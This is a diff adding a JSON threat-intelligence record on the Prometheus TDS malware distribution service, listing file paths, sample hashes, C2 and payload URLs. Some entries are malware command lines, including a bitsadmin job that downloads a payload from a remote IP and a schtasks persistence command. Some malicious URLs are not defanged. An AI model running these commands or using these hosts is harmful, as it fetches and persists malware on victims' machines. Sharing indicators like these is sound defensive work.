@@ -1,0 +1,362 @@
+{
+  "malware_family": "Prometheus TDS",
+  "threat_actor": "Main",
+  "platforms": [
+    "windows",
+    "web"
+  ],
+  "summary": "Prometheus TDS is a Traffic Direction System (TDS) sold as a service on underground forums, attributed to an actor named 'Main'. It utilizes a PHP backdoor, Prometheus.Backdoor, on compromised websites to filter victims and deliver malware payloads such as Hancitor, QBot, IcedID, and Buer Loader. The system can also redirect users to phishing sites or other malicious content based on configurable rules.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "file_name",
+      "value": "Prometheus.Backdoor",
+      "context": "PHP backdoor uploaded to compromised websites to act as a gate.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "c:\\users\\%username%\\appdata\\local\\temp\\Static.dll",
+      "context": "Hancitor payload dropped and executed by malicious document macros.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cmd /k exit | exit & bitsadmin /create EncodingFirm & exit",
+      "context": "VBS Loader creates a BITS job named 'EncodingFirm'.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cmd /k exit | exit & bitsadmin /addfile EncodingFirm hXXp://155[.]94[.]193[.]10/user/get/ButPrinciple1619186669 C:\\Users\\<User>\\AppData\\Local\\Temp\\DefineKeeps.tmp & exit",
+      "context": "VBS Loader uses BITS to download a payload.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "scheduled_task",
+      "value": "Task Update ButPrinciple",
+      "context": "VBS Loader persistence mechanism.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cmd /k exit | exit & schtasks /create /sc minute /mo 30 /tn “Task Update ButPrinciple” /f /st 00:00 /tr C:\\Users\\<User>\\AppData\\Local\\ButPrinciple\\ButPrinciple.vbs & exit",
+      "context": "VBS Loader creates scheduled task to run every 30 minutes.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "EncodingFirm",
+      "context": "Name of the BITS job created by the VBS loader.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\<User>\\AppData\\Local\\ButPrinciple\\ButPrinciple.vbs",
+      "context": "Path to the persisted VBS script executed by the scheduled task.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "document010498.jnlp",
+      "context": "Buer Loader Java Network Launch Protocol (JNLP) file.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "invoice.jnlp",
+      "context": "Buer Loader Java Network Launch Protocol (JNLP) file.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "<argument>Buer</argument>",
+      "context": "Argument string found inside Buer Loader's invoice.jnlp file.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "artem v gushin",
+      "context": "WHOIS registrant name for Buer Loader C2 domain.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "data:application/octet-stream;base64,",
+      "context": "JavaScript code prefix used by Prometheus.Backdoor to serve malicious files.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Main",
+      "context": "Prometheus TDS author's username on underground forum.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Update browser",
+      "context": "Button text on the fake SocGholish browser update landing page.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "readies.php",
+      "context": "Filename of a Prometheus.Backdoor instance used in a Hancitor campaign.",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "uri_path",
+      "value": "/campo/",
+      "context": "Distinctive URI path prefix for Campo Loader C2 communications.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "xn--keynvigatorkey-yp8g.com",
+      "context": "Hancitor phishing IDN domain (keynavigatorkey.com).",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://webworks.nepila.com/readies.php",
+      "context": "Hancitor campaign link pointing to a Prometheus.Backdoor instance.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/8/forum.php",
+      "context": "Hancitor C2 callback URI path.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://ementincied.com/8/forum.php",
+      "context": "Hancitor C2 server URL.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://inpulsion.net/ds/0702.gif",
+      "context": "QBot payload download URL.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://aramiglobal.com/ds/0502.gif",
+      "context": "QBot payload download URL.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://denazao.info/images/1j.djvu",
+      "context": "IcedID DLL payload download URL.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://twotimercvac.uno/",
+      "context": "IcedID C2 server URL.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/user/get/",
+      "context": "VBS loader payload download URI path.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "secure-doc-viewer.com",
+      "context": "Buer Loader payload download domain.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "pdfsecure.net",
+      "context": "Domain related to Buer Loader infrastructure.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://huvpn.com/free-vpn/",
+      "context": "Fake Windscribe VPN provider website used for redirection.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://windscribe.s3.us-east-2.amazonaws.com/Windscribe.exe",
+      "context": "Download link for the fake Windscribe VPN installer.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "hotaiddeal.su",
+      "context": "Pharma spam affiliate redirection site.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "banking.sparkasse.de-id1897ajje9021ucn9021345345b0juah10zb1092uhda.xyz",
+      "context": "German banking phishing domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "109.248.11.132",
+      "context": "Prometheus TDS Admin Panel IP.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "185.186.142.191",
+      "context": "Prometheus TDS Admin Panel IP.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "2777c710350668010542846968025d642d40984fa87ad21b3b175c0d2f7e0b31",
+      "description": "Prometheus.Backdoor JavaScript component"
+    },
+    {
+      "sha256": "a1b1abdf519253a12450708043cfe4fbcc586f288de16f84a64a419521e7f9ba",
+      "description": "Campo Loader lure document (order-details-706518.xlsb)"
+    },
+    {
+      "sha256": "b7efa1277c0c0fba754994adf9792fbb3feac9ec3e589b3da4d0125957cc95a4",
+      "description": "Hancitor lure document (0301_343810790.doc)"
+    },
+    {
+      "sha256": "8932db61f72108f0af9267056e74b0e099470b27fe62f997ecd092db8db20945",
+      "description": "QBot lure document (document-12603942.xls)"
+    },
+    {
+      "sha256": "3041387a18df225d20b6564068f23adcb746f1560e9ae466c81163d96e46c258",
+      "description": "IcedID lure document (Documents_682784324_1073289308.xls)"
+    },
+    {
+      "sha256": "5953e3aa6c6b1d7330f54e4fc92bee899ba6c109af173c975a57364253c60bbe",
+      "description": "VBS loader archive (mike_5131337.zip)"
+    },
+    {
+      "sha256": "e44d72b2e48262424c9f0c62a9e9fb532686edc1f8d6e5c94d8c94ef76afc3f4",
+      "description": "Buer Loader archive (document010498.zip)"
+    },
+    {
+      "sha256": "14a2744c4278bfdc4197793f928a24fd1036f604e5e68a7e5473ce224a7f728f",
+      "description": "SocGholish archive (Chrome.992d73.zip)"
+    },
+    {
+      "sha256": "1495500d6c8613fda22b0e0c8f2ab0ba5d244d6b166c5d854a47000a91f44ab1",
+      "description": "Fake Windscribe VPN installer (Windscribe.exe)"
+    }
+  ],
+  "file_types": [
+    "script",
+    "document",
+    "pe",
+    "archive"
+  ]
+}
